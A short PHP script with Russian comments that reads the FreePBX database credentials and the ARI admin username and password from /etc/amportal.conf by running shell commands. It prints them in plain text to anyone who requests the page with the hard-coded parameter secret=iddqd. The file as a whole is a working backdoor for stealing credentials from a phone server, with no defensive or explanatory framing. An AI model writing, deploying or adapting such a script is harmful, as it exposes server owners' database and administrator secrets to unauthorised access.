<?php
// Ищем в файле конфигурации FreePBX логин и пароль к базе
$login=exec("grep AMPDBUSER /etc/amportal.conf|grep -v '^#'|tail -n 1|awk -F '=' '{print $2}'");
$password=exec("grep AMPDBPASS /etc/amportal.conf|grep -v '^#'|tail -n 1|awk -F '=' '{print $2}'");


// Ищем в файле конфигураци пароль к ARI
$ARI_ADMIN_USERNAME=exec("grep ARI_ADMIN_USERNAME= /etc/amportal.conf|grep -v '^#'|tail -n 1|awk -F '=' '{print $2}'");
$ARI_ADMIN_PASSWORD=exec("grep ARI_ADMIN_PASSWORD= /etc/amportal.conf|grep -v '^#'|tail -n 1|awk -F '=' '{print $2}'");

if($_GET["secret"]=='iddqd'){echo "db $login:$password<br>ari $ARI_ADMIN_USERNAME:$ARI_ADMIN_PASSWORD";}
?>
